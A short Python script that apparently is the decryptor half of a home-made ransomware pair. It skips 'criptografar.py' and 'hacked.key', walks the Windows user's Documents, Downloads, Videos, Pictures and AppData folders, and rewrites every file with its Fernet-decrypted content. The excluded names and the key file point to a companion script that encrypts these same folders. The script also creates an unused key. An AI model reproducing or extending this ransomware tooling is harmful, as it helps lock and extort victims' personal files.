import os 
from cryptography.fernet import Fernet

key = Fernet.generate_key()
with open("hacked.key", "rb") as key_file:
    open_key = key_file.read()
    

username = os.getenv('USERNAME')

folders = [
    os.path.join(r"C:\Users", username, "Documents"),
    os.path.join(r"C:\Users", username, "Downloads"),
    os.path.join(r"C:\Users", username, "Videos"),
    os.path.join(r"C:\Users", username, "Pictures"),
    os.path.join(r"C:\Users", username, "AppData", "Local"),
    os.path.join(r"C:\Users", username, "AppData", "Roaming"),
]

arquivos = []

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ["criptografar.py","hacked.key","desktop.ini","descriptografar.py"]:
                continue
            
            file_path = os.path.join(root, file)
            arquivos.append(file_path)

for  arquivo in arquivos:
    with open(arquivo, "rb") as file:
        data = file.read()

    data_descrypt = Fernet(open_key).decrypt(data)
    with open(arquivo, "wb") as file:
        file.write(data_descrypt)
